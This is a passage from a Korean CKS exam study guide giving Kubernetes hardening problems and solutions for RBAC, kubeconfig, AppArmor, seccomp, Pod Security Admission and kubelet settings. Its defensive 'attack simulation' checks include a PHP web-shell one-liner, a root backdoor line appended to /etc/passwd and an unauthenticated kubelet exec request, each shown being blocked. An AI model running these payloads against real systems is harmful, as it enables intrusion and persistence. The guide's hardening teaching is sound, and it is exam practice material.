# 불필요한 바인딩 삭제 후 권한 확인
kubectl delete clusterrolebinding jane-cluster-admin
kubectl auth can-i get secrets --all-namespaces --as=jane
```
```text
no
```

`cluster-admin`은 모든 리소스에 대한 모든 권한을 가지는 매우 강력한 ClusterRole이다. 실제 운영 환경에서는 극소수의 관리자만 이 권한을 가져야 하며, 정기적으로 감사해야 한다.

**출제 의도:** 과도한 클러스터 관리자 권한이 부여된 주체를 식별하고 제거하는 RBAC 감사 능력을 검증한다. cluster-admin 권한의 무분별한 부여는 보안 사고의 주요 원인이다.

**핵심 원리:** `cluster-admin` ClusterRole은 모든 API 그룹의 모든 리소스에 대해 모든 verb를 허용하는 와일드카드(`*`) 규칙을 포함한다. ClusterRoleBinding은 클러스터 전체 스코프에서 이 권한을 주체에게 부여한다. RBAC 감사는 `jq`로 JSON 출력을 파싱하여 수행하며, `system:` 접두사는 Kubernetes 내장 시스템 컴포넌트를 나타낸다.

**함정과 주의사항:**
- `system:masters` 그룹에 바인딩된 `cluster-admin-binding`은 삭제하면 안 된다. 이것은 kubeadm이 생성한 필수 바인딩이다.
- RoleBinding으로도 ClusterRole을 참조할 수 있다. `kubectl get rolebindings -A`도 함께 확인해야 완전한 감사가 된다.
- ServiceAccount에 cluster-admin이 바인딩된 경우, 해당 SA의 토큰이 탈취되면 클러스터 전체가 침해된다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 탈취된 사용자 계정으로 전체 클러스터 제어 | 불필요한 cluster-admin 바인딩 제거 |
| CI/CD SA 토큰으로 Secret 전수 탈취 | SA에서 cluster-admin 제거, 최소 권한 Role 부여 |
| 퇴직자 계정의 잔존 권한 악용 | 정기 감사로 미사용 바인딩 정리 |
</details>

---

### 문제 10. [Cluster Hardening] kubeconfig 보안

워커 노드 `node01`에서 `/root/.kube/config`에 저장된 kubeconfig 파일의 보안 문제를 해결하라:
1. 파일 권한을 소유자만 읽기/쓰기할 수 있도록 제한하라
2. 불필요한 context `old-cluster`를 제거하라

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. SSH 접속
ssh node01

# 2. 파일 권한 확인 및 수정
ls -la /root/.kube/config
# 644 또는 그보다 느슨한 권한이면 수정 필요

chmod 600 /root/.kube/config
ls -la /root/.kube/config
# -rw------- 확인

# 3. 불필요한 context 확인
kubectl config get-contexts --kubeconfig=/root/.kube/config

# 4. old-cluster context 삭제
kubectl config delete-context old-cluster --kubeconfig=/root/.kube/config

# 5. 관련 cluster/user 정보도 삭제
kubectl config delete-cluster old-cluster --kubeconfig=/root/.kube/config
kubectl config delete-user old-cluster-admin --kubeconfig=/root/.kube/config

# 6. 최종 확인
kubectl config get-contexts --kubeconfig=/root/.kube/config
```

**검증 - 공격 시뮬레이션:**
```bash
# 파일 권한 확인
ls -la /root/.kube/config
```
```text
-rw------- 1 root root 5482 Mar 15 10:30 /root/.kube/config
```
```bash
# 다른 사용자가 읽을 수 없는지 확인
su - testuser -c "cat /root/.kube/config"
```
```text
cat: /root/.kube/config: Permission denied
```
```bash
# old-cluster context가 제거되었는지 확인
kubectl config get-contexts --kubeconfig=/root/.kube/config
```
```text
CURRENT   NAME       CLUSTER    AUTHINFO   NAMESPACE
*         cluster1   cluster1   admin      default
```

kubeconfig 파일에는 클러스터 접근 자격 증명(인증서, 토큰 등)이 포함되어 있으므로, 파일 권한을 600(소유자만 읽기/쓰기)으로 설정해야 한다. 불필요한 context는 공격 표면을 줄이기 위해 제거해야 한다.

**출제 의도:** 자격 증명 파일의 파일시스템 레벨 보안과 불필요한 접근 정보 제거 능력을 검증한다. kubeconfig은 클러스터의 열쇠와 같으므로 철저히 관리해야 한다.

**핵심 원리:** Linux 파일 권한은 소유자(owner)/그룹(group)/기타(others) 3단위로 읽기(r=4)/쓰기(w=2)/실행(x=1)을 조합한다. `chmod 600`은 소유자에게만 읽기+쓰기를 허용하고 그룹/기타의 모든 권한을 제거한다. 커널의 VFS(Virtual File System) 계층이 매 파일 접근 시 DAC(Discretionary Access Control) 검사를 수행한다.

**함정과 주의사항:**
- context만 삭제하고 cluster/user 엔트리를 남기면 자격 증명이 파일에 잔존한다. 반드시 `delete-cluster`와 `delete-user`도 실행하라.
- `chmod 600`이 아닌 `chmod 400`(읽기만)으로 설정하면 kubectl이 context 수정 시 쓸 수 없다. 600이 적절하다.
- kubeconfig에 base64 인코딩된 인증서 키가 인라인으로 포함되어 있을 수 있다. 이 경우 파일 유출 시 즉시 클러스터 접근이 가능하다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 다른 사용자가 kubeconfig 읽기 | 600 권한으로 소유자만 접근 가능 |
| 폐기된 클러스터 자격 증명 악용 | old-cluster context/credentials 삭제 |
| 파일 유출 시 다중 클러스터 침해 | 불필요한 cluster 정보 제거로 피해 범위 축소 |
</details>

---

## System Hardening (15%) - 6문제

### 문제 11. [System Hardening] AppArmor 프로파일 적용

다음 AppArmor 프로파일을 `node01`에 로드하고, `secure-ns` 네임스페이스의 `nginx-pod` Pod에 적용하라. 프로파일은 모든 파일 쓰기를 거부하되 `/tmp`에만 쓰기를 허용해야 한다.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. node01에 SSH 접속하여 AppArmor 프로파일 생성
ssh node01
cat > /etc/apparmor.d/k8s-deny-write << 'EOF'
#include <tunables/global>

profile k8s-deny-write flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  file,

  deny /** w,
  /tmp/** rw,
}
EOF

# 2. 프로파일 로드
apparmor_parser -r /etc/apparmor.d/k8s-deny-write

# 3. 프로파일 확인
aa-status | grep k8s-deny-write

# 4. exit하여 컨트롤 플레인으로 돌아감
exit
```

Pod 정의 (annotation 방식, K8s 1.29 이하):
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx-pod
  namespace: secure-ns
  annotations:
    container.apparmor.security.beta.kubernetes.io/nginx: localhost/k8s-deny-write
spec:
  nodeName: node01  # AppArmor 프로파일이 로드된 노드에 스케줄링
  containers:
  - name: nginx
    image: nginx:1.25
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
```

Pod 정의 (securityContext 방식, K8s 1.30+):
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx-pod
  namespace: secure-ns
spec:
  nodeName: node01
  containers:
  - name: nginx
    image: nginx:1.25
    securityContext:
      appArmorProfile:
        type: Localhost
        localhostProfile: k8s-deny-write
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
```
```bash
kubectl apply -f nginx-pod.yaml

# 검증
kubectl exec nginx-pod -n secure-ns -- touch /root/test.txt
# Permission denied

kubectl exec nginx-pod -n secure-ns -- touch /tmp/test.txt
# (성공)
```

AppArmor 프로파일은 Pod가 스케줄링되는 노드에 미리 로드되어 있어야 한다. annotation의 컨테이너 이름(`nginx`)이 Pod spec의 컨테이너 이름과 정확히 일치해야 한다.

**검증 - 공격 시뮬레이션:**
```bash
# /root에 파일 쓰기 시도 (차단되어야 함)
kubectl exec nginx-pod -n secure-ns -- touch /root/malicious.sh
```
```text
touch: /root/malicious.sh: Permission denied
command terminated with exit code 1
```
```bash
# /etc/passwd 수정 시도 (차단)
kubectl exec nginx-pod -n secure-ns -- sh -c 'echo "hacker:x:0:0::/root:/bin/bash" >> /etc/passwd'
```
```text
sh: can't create /etc/passwd: Permission denied
```
```bash
# /tmp에 파일 쓰기 (허용)
kubectl exec nginx-pod -n secure-ns -- touch /tmp/allowed.txt
kubectl exec nginx-pod -n secure-ns -- ls /tmp/allowed.txt
```
```text
/tmp/allowed.txt
```
```bash
# 웹셸 드롭 시도 (차단)
kubectl exec nginx-pod -n secure-ns -- sh -c 'echo "<?php system($_GET[cmd]); ?>" > /var/www/html/shell.php'
```
```text
sh: can't create /var/www/html/shell.php: Permission denied
```

**출제 의도:** AppArmor MAC(Mandatory Access Control)를 사용하여 컨테이너의 파일시스템 접근을 세밀하게 제어하는 능력을 검증한다. 컨테이너 침해 시 파일 쓰기를 제한하면 악성 코드 설치와 설정 변조를 방어할 수 있다.

**핵심 원리:** AppArmor는 Linux LSM(Linux Security Module) 프레임워크에 플러그인되는 MAC 시스템이다. 커널의 LSM 후킹 포인트에서 프로세스의 파일/네트워크/능력 접근을 프로파일 규칙에 따라 허용/거부한다. `deny /** w`는 모든 경로에 대한 쓰기를 거부하고, `/tmp/** rw`는 /tmp 하위에 읽기/쓰기를 허용한다. 규칙은 가장 구체적인 것이 우선한다. `flags=(attach_disconnected,mediate_deleted)`는 컨테이너 환경에서 마운트 네임스페이스 관련 이벤트를 처리하기 위한 필수 플래그이다.

**함정과 주의사항:**
- annotation 키의 컨테이너 이름(`container.apparmor.security.beta.kubernetes.io/<container-name>`)이 Pod spec의 컨테이너 이름과 정확히 일치해야 한다. 오타가 있으면 프로파일이 적용되지 않는다.
- `nodeName`을 지정하지 않으면 프로파일이 로드되지 않은 노드에 스케줄될 수 있다. 그러면 Pod가 `Blocked` 상태가 된다.
- K8s 1.30+에서는 annotation 대신 `securityContext.appArmorProfile`을 사용한다. 시험 환경의 버전을 반드시 확인하라.
- `apparmor_parser -r`에서 `-r`은 replace(기존 프로파일 교체)를 의미한다. 새 프로파일이면 `-r` 없이도 동작하지만, 수정 시에는 `-r`이 필수이다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 웹셸 드롭 (파일 쓰기) | /tmp 외 모든 경로 쓰기 차단 |
| 크론탭 변조로 지속성 확보 | /etc/crontab 쓰기 차단 |
| 바이너리 교체(Living off the Land) | 실행 파일 경로 쓰기 차단 |
| SSH 키 주입 | /root/.ssh 쓰기 차단 |
</details>

---

### 문제 12. [System Hardening] seccomp 프로파일 적용

`node01`의 `/var/lib/kubelet/seccomp/profiles/` 디렉토리에 커스텀 seccomp 프로파일을 생성하라. 이 프로파일은 `mkdir`과 `chmod` 시스템콜을 차단해야 한다. 그리고 `secure-pod`에 이 프로파일을 적용하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. node01에 SSH 접속
ssh node01

# 2. seccomp 프로파일 디렉토리 확인/생성
mkdir -p /var/lib/kubelet/seccomp/profiles

# 3. 커스텀 프로파일 생성
cat > /var/lib/kubelet/seccomp/profiles/no-mkdir-chmod.json << 'EOF'
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "syscalls": [
    {
      "names": ["mkdir", "mkdirat", "chmod", "fchmod", "fchmodat"],
      "action": "SCMP_ACT_ERRNO",
      "errnoRet": 1
    }
  ]
}
EOF

# 4. exit하여 컨트롤 플레인으로 돌아감
exit
```
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
  namespace: default
spec:
  nodeName: node01
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/no-mkdir-chmod.json
  containers:
  - name: app
    image: nginx:1.25
    securityContext:
      allowPrivilegeEscalation: false
```
```bash
kubectl apply -f secure-pod.yaml

# 검증
kubectl exec secure-pod -- mkdir /tmp/testdir
# mkdir: cannot create directory '/tmp/testdir': Operation not permitted

kubectl exec secure-pod -- chmod 777 /tmp
# chmod: changing permissions of '/tmp': Operation not permitted

# 다른 작업은 정상 동작
kubectl exec secure-pod -- ls /
# (성공)
```

`defaultAction: SCMP_ACT_ALLOW`로 설정하면 기본적으로 모든 시스템콜을 허용하고, 명시적으로 차단할 시스템콜만 `SCMP_ACT_ERRNO`로 지정한다. `localhostProfile`의 경로는 `/var/lib/kubelet/seccomp/` 기준 상대 경로이다.

**검증 - 공격 시뮬레이션:**
```bash
# mkdir 차단 확인
kubectl exec secure-pod -- mkdir /tmp/testdir
```
```text
mkdir: cannot create directory '/tmp/testdir': Operation not permitted
command terminated with exit code 1
```
```bash
# chmod 차단 확인
kubectl exec secure-pod -- chmod 777 /tmp
```
```text
chmod: changing permissions of '/tmp': Operation not permitted
command terminated with exit code 1
```
```bash
# mkdirat도 차단 확인 (mkdir의 변형 syscall)
kubectl exec secure-pod -- python3 -c "import os; os.makedirs('/tmp/test')"
```
```text
OSError: [Errno 1] Operation not permitted: '/tmp/test'
```
```bash
# 차단되지 않은 시스템콜은 정상 동작
kubectl exec secure-pod -- ls /
kubectl exec secure-pod -- cat /etc/hostname
```
```text
bin  boot  dev  etc  home  lib  ...
secure-pod
```

**출제 의도:** seccomp BPF 필터를 사용하여 컨테이너에서 허용되는 시스템콜을 세밀하게 제어하는 능력을 검증한다. 불필요한 시스템콜을 차단하면 커널 익스플로잇의 공격 표면을 줄일 수 있다.

**핵심 원리:** seccomp(Secure Computing Mode)는 Linux 커널의 시스템콜 필터링 메커니즘이다. BPF(Berkeley Packet Filter) 프로그램이 커널의 시스템콜 진입점에서 실행되어 각 시스템콜을 허용/거부/로깅한다. `SCMP_ACT_ERRNO`는 시스템콜을 차단하고 지정된 에러 번호를 반환한다. `mkdir`은 단일 시스템콜이 아니라 `mkdir`과 `mkdirat` 두 가지가 있으며, `chmod`도 `chmod`, `fchmod`, `fchmodat`의 변형이 있으므로 모두 차단해야 완전하다.

**함정과 주의사항:**
- `mkdir`만 차단하고 `mkdirat`를 빠뜨리면 glibc가 `mkdirat`로 폴백하여 우회된다. 시스템콜의 모든 변형을 차단해야 한다.
- `localhostProfile`의 경로는 `/var/lib/kubelet/seccomp/` 기준 상대 경로이다. 절대 경로를 쓰면 파일을 찾지 못한다.
- Pod 레벨(`spec.securityContext.seccompProfile`)과 컨테이너 레벨(`spec.containers[].securityContext.seccompProfile`) 모두에서 설정 가능하다. 컨테이너 레벨이 우선한다.
- seccomp 프로파일이 노드에 존재하지 않으면 Pod가 `CreateContainerError` 상태가 된다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 디렉토리 생성으로 악성 페이로드 스테이징 | mkdir/mkdirat 시스템콜 차단 |
| SUID 비트 설정으로 권한 상승 | chmod/fchmod/fchmodat 시스템콜 차단 |
| 커널 취약점 익스플로잇 | 공격에 필요한 시스템콜 자체를 차단 |
</details>

---

### 문제 13. [System Hardening] RuntimeDefault seccomp 적용

`production` 네임스페이스의 모든 Pod가 RuntimeDefault seccomp 프로파일을 사용하도록 Pod Security Admission을 설정하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 네임스페이스에 restricted 레벨 적용 (seccomp 필수)
kubectl label namespace production \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=latest \
  pod-security.kubernetes.io/warn=restricted \
  --overwrite
```

Restricted 레벨을 적용하면 seccomp 프로파일이 `RuntimeDefault` 또는 `Localhost`로 설정되지 않은 Pod는 생성이 거부된다.

```bash
# 검증: seccomp 미설정 Pod 생성 시도
kubectl run test --image=nginx -n production
# Error: violates PodSecurity "restricted:latest": ...
# seccompProfile.type must be "RuntimeDefault" or "Localhost"

# Restricted 준수 Pod
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: compliant-pod
  namespace: production
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: nginx:1.25
    securityContext:
      allowPrivilegeEscalation: false
      runAsUser: 1000
      capabilities:
        drop: ["ALL"]
EOF
# (성공)
```

**검증 - 공격 시뮬레이션:**
```bash
# seccomp 미설정 Pod 생성 시도 (거부)
kubectl run insecure --image=nginx -n production
```
```text
Error from server (Forbidden): pods "insecure" is forbidden: violates PodSecurity "restricted:latest":
  allowPrivilegeEscalation != false (container "insecure" must set securityContext.allowPrivilegeEscalation=false),
  unrestricted capabilities (container "insecure" must set securityContext.capabilities.drop=["ALL"]),
  runAsNonRoot != true (pod or container "insecure" must set securityContext.runAsNonRoot=true),
  seccompProfile (pod or container "insecure" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```
```bash
# privileged Pod 생성 시도 (거부)
kubectl run priv --image=nginx -n production --overrides='{"spec":{"containers":[{"name":"priv","image":"nginx","securityContext":{"privileged":true}}]}}'
```
```text
Error from server (Forbidden): pods "priv" is forbidden: violates PodSecurity "restricted:latest": privileged
```
```bash
# 준수 Pod는 정상 생성
kubectl get pod compliant-pod -n production
```
```text
NAME            READY   STATUS    RESTARTS   AGE
compliant-pod   1/1     Running   0          30s
```

Pod Security Admission의 `restricted` 레벨은 seccomp 프로파일 설정을 필수로 요구한다. 이는 `RuntimeDefault`(컨테이너 런타임 기본 프로파일) 또는 `Localhost`(커스텀 프로파일)를 사용해야 한다는 의미이다.

**출제 의도:** Pod Security Admission(PSA)을 사용하여 네임스페이스 단위로 보안 정책을 강제하는 능력을 검증한다. PSA는 PodSecurityPolicy(PSP)의 후속으로 K8s 1.25부터 GA이다.

**핵심 원리:** Pod Security Admission은 API server의 내장 어드미션 컨트롤러이다. 네임스페이스 라벨을 기반으로 `privileged`(무제한), `baseline`(최소 제한), `restricted`(최대 제한) 3가지 레벨을 적용한다. `restricted` 레벨은 seccomp 필수, non-root 실행, capabilities drop, 권한 상승 비활성화 등을 강제한다. RuntimeDefault seccomp 프로파일은 containerd/CRI-O가 제공하는 기본 프로파일로, 약 300개 이상의 위험한 시스템콜을 차단한다.

**함정과 주의사항:**
- `restricted` 레벨은 seccomp 외에도 `runAsNonRoot`, `allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]` 등을 모두 요구한다. seccomp만 설정하면 다른 조건에서 거부된다.
- `enforce-version`을 `latest`로 설정하면 Kubernetes 버전이 올라갈 때 정책이 자동으로 강화된다. 안정성이 중요하면 특정 버전(예: `v1.29`)을 지정하라.
- 기존 Pod는 PSA 라벨을 적용해도 영향받지 않는다. 새로 생성되는 Pod부터 적용된다. 기존 워크로드가 위반하는지 확인하려면 `warn` 모드를 먼저 적용하라.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 컨테이너 탈출 시도(unshare, ptrace 등) | RuntimeDefault가 위험 시스템콜 차단 |
| 권한 상승(setuid, capabilities 추가) | restricted 레벨이 권한 상승 차단 |
| 루트 권한으로 호스트 파일 접근 | runAsNonRoot 강제로 루트 실행 차단 |
</details>

---

### 문제 14. [System Hardening] 불필요한 서비스 비활성화

워커 노드 `node01`에서 보안 점검을 수행하라:
1. 실행 중인 서비스 목록을 확인하고, `rpcbind` 서비스가 실행 중이면 중지하고 비활성화하라
2. 열려 있는 포트를 확인하고, 포트 8888에서 리스닝 중인 프로세스를 찾아 종료하라

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. node01에 SSH 접속
ssh node01

# 2. rpcbind 서비스 상태 확인
systemctl status rpcbind

# 3. rpcbind 서비스 중지 및 비활성화
systemctl stop rpcbind
systemctl disable rpcbind

# 4. 확인
systemctl is-active rpcbind
# inactive
systemctl is-enabled rpcbind
# disabled

# 5. 열려 있는 포트 확인
ss -tlnp | grep 8888
# 또는
netstat -tlnp | grep 8888

# 6. 해당 포트에서 리스닝 중인 프로세스 PID 확인
ss -tlnp | grep 8888
# 출력 예: LISTEN 0 128 *:8888 *:* users:(("suspicious-proc",pid=12345,fd=3))

# 7. 프로세스 종료
kill -9 12345

# 8. 확인
ss -tlnp | grep 8888
# (출력 없음)
```

불필요한 서비스를 비활성화하는 것은 공격 표면을 줄이는 기본적인 보안 원칙이다. `systemctl disable`은 부팅 시 자동 시작을 방지하고, `systemctl stop`은 현재 실행 중인 서비스를 즉시 중지한다.

**검증 - 공격 시뮬레이션:**
```bash
# rpcbind 서비스 비활성화 확인
systemctl is-active rpcbind
```
```text
inactive
```
```bash
systemctl is-enabled rpcbind
```
```text
disabled
```
```bash
# rpcbind 포트(111)가 더 이상 열려 있지 않은지 확인
ss -tlnp | grep 111
```
```text
(출력 없음)
```
```bash
# 포트 8888의 프로세스 종료 확인
ss -tlnp | grep 8888
```
```text
(출력 없음)
```

**출제 의도:** 노드 레벨의 공격 표면을 최소화하는 능력을 검증한다. 불필요한 서비스와 열린 포트는 공격자에게 추가적인 진입점을 제공한다.

**핵심 원리:** 리눅스 서비스는 systemd가 관리한다. `systemctl stop`은 cgroup을 통해 서비스 프로세스를 종료하고, `systemctl disable`은 `/etc/systemd/system/` 심볼릭 링크를 제거하여 부팅 시 자동 시작을 방지한다. `ss -tlnp`는 커널의 소켓 테이블을 직접 조회하여 리스닝 중인 TCP 소켓과 해당 프로세스를 표시한다.

**함정과 주의사항:**
- `stop`만 하고 `disable`을 빠뜨리면 노드 재부팅 시 서비스가 다시 시작된다.
- `kill -9`은 SIGKILL로 즉시 종료하지만, 프로세스가 자식 프로세스를 생성했을 수 있다. `kill -9` 후 `ss`로 포트가 해제되었는지 반드시 재확인하라.
- rpcbind는 NFS에 필요한 서비스이다. NFS를 사용 중이면 비활성화하면 안 된다. 시험에서는 문제 지시에 따르라.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| rpcbind 취약점(CVE)을 통한 원격 코드 실행 | 서비스 비활성화로 취약점 자체가 노출되지 않음 |
| 의심스러운 포트에서 리스닝하는 백도어 | 프로세스 종료로 백도어 제거 |
| 불필요한 서비스를 통한 정보 수집 | 서비스 비활성화로 정보 노출 차단 |
</details>

---

### 문제 15. [System Hardening] AppArmor - complain 모드에서 enforce 모드로 전환

`node01`에 `docker-default` AppArmor 프로파일이 complain 모드로 로드되어 있다. 이를 enforce 모드로 전환하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. node01에 SSH 접속
ssh node01

# 2. 현재 프로파일 상태 확인
aa-status
# docker-default (complain)

# 3. enforce 모드로 전환
aa-enforce /etc/apparmor.d/docker-default
# 또는
apparmor_parser -r /etc/apparmor.d/docker-default

# 4. 확인
aa-status | grep docker-default
# docker-default (enforce)
```

**검증 - 공격 시뮬레이션:**
```bash
# enforce 모드 전환 확인
aa-status | grep docker-default
```
```text
   docker-default (enforce)
```
```bash
# complain 모드 목록에서 사라졌는지 확인
aa-status
```
```text
apparmor module is loaded.
42 profiles are loaded.
42 profiles are in enforce mode.
   ...
   docker-default
   ...
0 profiles are in complain mode.
```
```bash
# enforce 모드에서 정책 위반 시 차단 확인 (프로파일 규칙에 따라 다름)
# docker-default 프로파일은 /proc 쓰기 등을 차단
```

`complain` 모드는 정책 위반을 로그로 기록하기만 하고 차단하지 않는다. `enforce` 모드는 정책 위반 시 실제로 차단한다. 프로덕션 환경에서는 반드시 enforce 모드를 사용해야 한다.

**출제 의도:** AppArmor 프로파일의 모드를 전환하는 능력을 검증한다. complain 모드는 테스트/개발용이며, 프로덕션에서는 enforce 모드가 필수이다.

**핵심 원리:** AppArmor 프로파일은 두 가지 모드로 동작한다. complain 모드에서는 커널 LSM 후킹 포인트가 정책 위반을 탐지하되 `AUDIT` 로그만 기록하고 동작을 허용한다. enforce 모드에서는 정책 위반 시 `DENIED` 로그를 기록하고 해당 시스템콜을 EPERM으로 거부한다. `aa-enforce` 명령은 프로파일 파일의 플래그를 변경하고 커널에 재로드한다.

**함정과 주의사항:**
- `aa-enforce`와 `apparmor_parser -r`의 차이: `aa-enforce`는 프로파일을 enforce 모드로 전환하는 전용 명령이고, `apparmor_parser -r`은 프로파일 파일에 정의된 모드로 재로드한다. 프로파일 파일에 `flags=(complain)`이 포함되어 있으면 `apparmor_parser -r`로는 enforce로 전환되지 않는다.
- `aa-complain`으로 되돌릴 수 있다. 시험에서 실수로 잘못된 프로파일을 enforce하면 애플리케이션이 동작하지 않을 수 있다.
- AppArmor가 설치되어 있지 않은 노드에서는 이 명령이 실패한다. `aa-status`로 먼저 AppArmor 활성화 여부를 확인하라.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| complain 모드에서 정책 위반 동작 수행 | enforce 전환으로 실제 차단 |
| 컨테이너 내 비정상 파일 접근 | enforce 모드가 접근을 EPERM으로 거부 |
| 보안 감사에서 complain 모드 지적 | enforce 전환으로 컴플라이언스 충족 |
</details>

---

### 문제 16. [System Hardening] kubelet 보안 설정

워커 노드 `node01`의 kubelet 설정을 강화하라:
1. 익명 인증을 비활성화하라
2. authorization 모드를 Webhook으로 설정하라
3. readOnlyPort를 비활성화하라 (0으로 설정)

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. node01에 SSH 접속
ssh node01

# 2. kubelet 설정 파일 백업
cp /var/lib/kubelet/config.yaml /var/lib/kubelet/config.yaml.bak

# 3. kubelet 설정 수정
vi /var/lib/kubelet/config.yaml
```

수정할 항목:
```yaml
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
authentication:
  anonymous:
    enabled: false      # 익명 인증 비활성화
  webhook:
    enabled: true
authorization:
  mode: Webhook          # Webhook 인가 모드
readOnlyPort: 0          # 읽기 전용 포트 비활성화
```
```bash
# 4. kubelet 재시작
systemctl restart kubelet

# 5. kubelet 상태 확인
systemctl status kubelet

# 6. 익명 접근 차단 확인
curl -k https://localhost:10250/pods
# 401 Unauthorized

# 7. 읽기 전용 포트 차단 확인
curl http://localhost:10255/pods
# Connection refused (포트가 열리지 않음)
```

**검증 - 공격 시뮬레이션:**
```bash
# 익명 인증 차단: kubelet API에 직접 접근 시도
curl -sk https://localhost:10250/pods
```
```text
Unauthorized
```
```bash
# 읽기 전용 포트 차단: 인증 없이 Pod 정보 수집 시도
curl -s http://localhost:10255/pods
```
```text
curl: (7) Failed to connect to localhost port 10255: Connection refused
```
```bash
# kubelet exec API를 통한 명령 실행 시도 (인증 없이)
curl -sk -XPOST "https://localhost:10250/run/default/nginx/nginx" -d "cmd=id"
```
```text
Unauthorized
```

kubelet의 `readOnlyPort: 0`은 인증 없이 접근 가능한 10255 포트를 비활성화한다. `authentication.anonymous.enabled: false`는 인증되지 않은 요청을 거부한다. `authorization.mode: Webhook`은 API server에 인가를 위임한다.

**출제 의도:** kubelet API의 인증/인가를 강화하여 노드 레벨 공격을 방어하는 능력을 검증한다. kubelet API는 Pod 실행, 로그 접근, exec 등 강력한 기능을 제공하므로 반드시 보호해야 한다.

**핵심 원리:** kubelet은 두 개의 포트를 노출한다: 10250(HTTPS, 인증 가능)과 10255(HTTP, 인증 없음). `readOnlyPort: 0`은 10255를 완전히 비활성화한다. `authentication.anonymous.enabled: false`는 클라이언트 인증서 또는 Bearer 토큰이 없는 요청을 거부한다. `authorization.mode: Webhook`은 kubelet이 API server의 SubjectAccessReview API를 호출하여 요청자의 권한을 확인한다. 이 없이는 AlwaysAllow가 기본값이어서 인증만 통과하면 모든 작업이 허용된다.

**함정과 주의사항:**
- `authorization.mode: Webhook`을 설정하면 kubelet이 API server에 접근할 수 있어야 한다. 네트워크 문제로 API server에 연결할 수 없으면 kubelet이 정상 동작하지 않는다.
- 설정 파일 수정 후 `systemctl restart kubelet`을 빠뜨리면 변경이 적용되지 않는다.
- `readOnlyPort`의 기본값은 10255이다. 0이 아닌 다른 값을 설정하면 해당 포트로 읽기 전용 API가 노출된다.
- kubelet 설정 파일 경로는 환경마다 다를 수 있다. `/var/lib/kubelet/config.yaml` 또는 systemd unit 파일의 `--config` 플래그를 확인하라.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 10255 포트로 인증 없이 Pod 목록/메트릭 수집 | readOnlyPort=0으로 포트 자체 비활성화 |
| kubelet API로 컨테이너 내 명령 실행(exec) | 익명 인증 차단 + Webhook 인가 |
| kubelet API를 통한 Secret 데이터 접근 | 인증+인가 강화로 미인가 접근 차단 |
</details>

---

## Minimize Microservice Vulnerabilities (20%) - 8문제

### 문제 17. [Microservice Vulnerabilities] Pod Security Admission - Baseline 적용

`staging` 네임스페이스에 Pod Security Admission을 적용하라:
- enforce 모드: baseline 레벨
- warn 모드: restricted 레벨
- audit 모드: restricted 레벨

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
kubectl label namespace staging \
  pod-security.kubernetes.io/enforce=baseline \
  pod-security.kubernetes.io/enforce-version=latest \
  pod-security.kubernetes.io/warn=restricted \
  pod-security.kubernetes.io/warn-version=latest \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/audit-version=latest \
  --overwrite

# 검증
kubectl get namespace staging --show-labels

# 테스트: privileged Pod (baseline 위반, 거부됨)
kubectl run test --image=nginx -n staging --overrides='{
  "spec": {
    "containers": [{
      "name": "test",
      "image": "nginx",
      "securityContext": {"privileged": true}
    }]
  }
}'
# Error from server (Forbidden): ... violates PodSecurity "baseline:latest"

# 테스트: 일반 Pod (baseline 통과, restricted 경고)
kubectl run test --image=nginx -n staging
# Warning: would violate PodSecurity "restricted:latest": ...
# pod/test created (baseline은 통과하므로 생성됨, restricted 경고만 표시)
```

이 구성은 점진적 보안 강화 전략이다. baseline을 강제하여 명백한 보안 위반을 차단하고, restricted를 warn/audit으로 설정하여 추후 restricted로 전환할 때 영향 받는 워크로드를 사전에 파악할 수 있다.

**검증 - 공격 시뮬레이션:**
```bash
# privileged 컨테이너 생성 시도 (baseline에서 차단)
kubectl run attack --image=nginx -n staging --overrides='{"spec":{"containers":[{"name":"attack","image":"nginx","securityContext":{"privileged":true}}]}}'
```
```text
Error from server (Forbidden): pods "attack" is forbidden: violates PodSecurity "baseline:latest": privileged (container "attack" must not set securityContext.privileged=true)
```
```bash
# hostNetwork 사용 시도 (baseline에서 차단)
kubectl run hostnet --image=nginx -n staging --overrides='{"spec":{"hostNetwork":true,"containers":[{"name":"hostnet","image":"nginx"}]}}'
```
```text
Error from server (Forbidden): pods "hostnet" is forbidden: violates PodSecurity "baseline:latest": host namespaces (hostNetwork=true)
```
```bash
# 일반 Pod 생성 (baseline 통과, restricted 경고)
kubectl run normal --image=nginx -n staging
```
```text
Warning: would violate PodSecurity "restricted:latest": allowPrivilegeEscalation != false, unrestricted capabilities, runAsNonRoot != true, seccompProfile
pod/normal created
```

